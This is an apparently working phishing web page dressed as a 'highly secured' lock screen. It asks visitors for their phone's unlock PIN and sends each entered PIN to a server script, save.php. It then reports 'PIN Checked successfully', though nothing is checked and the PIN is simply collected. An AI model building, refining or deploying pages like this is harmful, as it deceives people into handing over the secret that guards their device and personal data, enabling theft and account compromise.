<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Rasu's Amazing Web Site</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;

            background: #080b10;

            font-family: Arial, Helvetica, sans-serif;

            color: white;
        }

        .phone {
            width: 370px;
            max-width: 94vw;

            background: #11151c;

            border-radius: 35px;

            padding: 22px;

            box-shadow:
                0 30px 80px rgba(0,0,0,0.65),
                inset 0 0 0 1px rgba(255,255,255,0.06);
        }

        /* Top */

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;

            color: #8d96a6;

            font-size: 12px;

            letter-spacing: 2px;

            padding: 5px 5px 25px;
        }

        .status {
            color: #40df91;
            font-size: 10px;
        }

        /* Screen */

        .screen {
            text-align: center;

            padding: 25px 5px 20px;
        }

        .lock-icon {
            font-size: 40px;

            margin-bottom: 15px;
        }

        h1 {
            font-size: 26px;

            font-weight: 600;

            margin-bottom: 8px;
        }

        .subtitle {
            color: #858e9d;

            font-size: 14px;

            margin-bottom: 28px;
        }

        /* PIN dots */

        .pin-dots {
            height: 20px;

            display: flex;

            justify-content: center;

            align-items: center;

            gap: 13px;
        }

        .pin-dots span {
            width: 12px;
            height: 12px;

            border-radius: 50%;

            background: #353b46;

            transition: 0.2s;
        }

        .pin-dots span.active {
            background: white;

            transform: scale(1.15);

            box-shadow: 0 0 12px rgba(255,255,255,0.5);
        }

        /* Message */

        .message {
            height: 25px;

            margin-top: 14px;

            font-size: 13px;
        }

        /* Keypad */

        .keypad {
            display: grid;

            grid-template-columns: repeat(3, 1fr);

            gap: 12px;

            margin-top: 10px;
        }

        .key {
            height: 68px;

            border: none;

            border-radius: 21px;

            background: #1c222b;

            color: white;

            cursor: pointer;

            display: flex;

            flex-direction: column;

            justify-content: center;

            align-items: center;

            box-shadow:
                inset 0 1px 0 rgba(255,255,255,0.04),
                0 5px 12px rgba(0,0,0,0.2);

            transition: 0.12s;
        }

        .key strong {
            font-size: 24px;

            font-weight: 400;
        }

        .key small {
            color: #737d8d;

            font-size: 8px;

            letter-spacing: 2px;

            margin-top: 3px;
        }

        .key:hover {
            background: #272e39;
        }

        .key:active {
            transform: scale(0.92);

            background: #343c48;
        }

        /* Special keys */

        .key.special {
            font-size: 20px;

            color: #aeb6c3;
        }

        .key.clear {
            color: #ff6868;
        }

        .key.backspace {
            color: #ffc857;
        }

        /* Enter */

        .enter-button {
            width: 100%;

            height: 58px;

            margin-top: 15px;

            border: none;

            border-radius: 20px;

            background: linear-gradient(
                135deg,
                #42e695,
                #20bdff
            );

            color: #061014;

            font-size: 15px;

            font-weight: bold;

            letter-spacing: 2px;

            cursor: pointer;

            transition: 0.15s;

            box-shadow:
                0 8px 25px rgba(32,189,255,0.18);
        }

        .enter-button:hover {
            transform: translateY(-2px);
        }

        .enter-button:active {
            transform: scale(0.97);
        }

        .enter-button:disabled {
            opacity: 0.6;

            cursor: not-allowed;
        }

        /* Mobile */

        @media (max-width: 420px) {

            body {
                background: #11151c;
            }

            .phone {
                width: 100%;

                max-width: 100%;

                min-height: 100vh;

                border-radius: 0;

                display: flex;

                flex-direction: column;

                justify-content: center;

                box-shadow: none;
            }

            .key {
                height: 65px;
            }
        }
    </style>
</head>

<body>

<div class="phone">

    <div class="top-bar">
        <span>Rasu Amazing Web</span>
        <span class="status">●</span>
    </div>

    <div class="screen">

        <div class="lock-icon">🔐</div>

        <p class="subtitle">To log and view This Web Enter PIN of your phone.</p>
        <p>Highe secured website</p>
        <h1>Enter PIN</h1>

        <p class="subtitle">
            Enter your 4–6 digit PIN
            
        </p>

        <div id="pinDots" class="pin-dots">

            <span></span>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
            <span></span>

        </div>

        <div id="message" class="message"></div>

    </div>


    <div class="keypad">

        <button class="key" onclick="pressKey('1')">
            <strong>1</strong>
        </button>

        <button class="key" onclick="pressKey('2')">
            <strong>2</strong>
            <small>ABC</small>
        </button>

        <button class="key" onclick="pressKey('3')">
            <strong>3</strong>
            <small>DEF</small>
        </button>

        <button class="key" onclick="pressKey('4')">
            <strong>4</strong>
            <small>GHI</small>
        </button>

        <button class="key" onclick="pressKey('5')">
            <strong>5</strong>
            <small>JKL</small>
        </button>

        <button class="key" onclick="pressKey('6')">
            <strong>6</strong>
            <small>MNO</small>
        </button>

        <button class="key" onclick="pressKey('7')">
            <strong>7</strong>
            <small>PQRS</small>
        </button>

        <button class="key" onclick="pressKey('8')">
            <strong>8</strong>
            <small>TUV</small>
        </button>

        <button class="key" onclick="pressKey('9')">
            <strong>9</strong>
            <small>WXYZ</small>
        </button>

        <button class="key special clear" onclick="clearPin()">
            C
        </button>

        <button class="key" onclick="pressKey('0')">
            <strong>0</strong>
            <small>+</small>
        </button>

        <button class="key special backspace" onclick="deleteLast()">
            ⌫
        </button>

    </div>


    <button
        id="enterButton"
        class="enter-button"
        onclick="submitPin()">

        ENTER

    </button>

</div>


<script>

let pin = "";

const MIN_LENGTH = 4;
const MAX_LENGTH = 6;


/* Number pressed */

function pressKey(number) {

    if (pin.length >= MAX_LENGTH) {

        showMessage(
            "Maximum 6 digits allowed",
            "error"
        );

        return;
    }

    pin += number;

    updateDisplay();

    clearMessage();
}


/* Delete */

function deleteLast() {

    if (pin.length > 0) {

        pin = pin.slice(0, -1);

    }

    updateDisplay();

    clearMessage();
}


/* Clear */

function clearPin() {

    pin = "";

    updateDisplay();

    clearMessage();
}


/* Update dots */

function updateDisplay() {

    const dots =
        document.querySelectorAll("#pinDots span");

    dots.forEach((dot, index) => {

        if (index < pin.length) {

            dot.classList.add("active");

        } else {

            dot.classList.remove("active");

        }

    });
}


/* Enter */

function submitPin() {

    if (pin.length < MIN_LENGTH) {

        showMessage(
            "PIN must contain at least 4 digits",
            "error"
        );

        return;
    }


    const button =
        document.getElementById("enterButton");

    button.disabled = true;

    button.textContent = "CHEKING...";


    fetch("save.php", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            pin: pin
        })

    })

    .then(response => response.json())

    .then(data => {

        if (data.success) {

            showMessage(
                "✓ PIN Checked successfully",
                "success"
            );

            pin = "";

            updateDisplay();

        } else {

            showMessage(
                data.message || "Save failed",
                "error"
            );

        }

    })

    .catch(error => {

        console.error(error);

        showMessage(
            "Could not connect to server",
            "error"
        );

    })

    .finally(() => {

        button.disabled = false;

        button.textContent = "ENTER";

    });
}


/* Message */

function showMessage(text, type) {

    const message =
        document.getElementById("message");

    message.textContent = text;

    if (type === "error") {

        message.style.color = "#ff6868";

    } else {

        message.style.color = "#42e695";

    }
}


function clearMessage() {

    document.getElementById("message").textContent = "";

}


/* Computer keyboard */

document.addEventListener(
    "keydown",
    function(event) {

        if (
            event.key >= "0" &&
            event.key <= "9"
        ) {

            pressKey(event.key);

        }

        else if (event.key === "Backspace") {

            deleteLast();

        }

        else if (event.key === "Escape") {

            clearPin();

        }

        else if (event.key === "Enter") {

            submitPin();

        }

    }
);

</script>

</body>
</html>
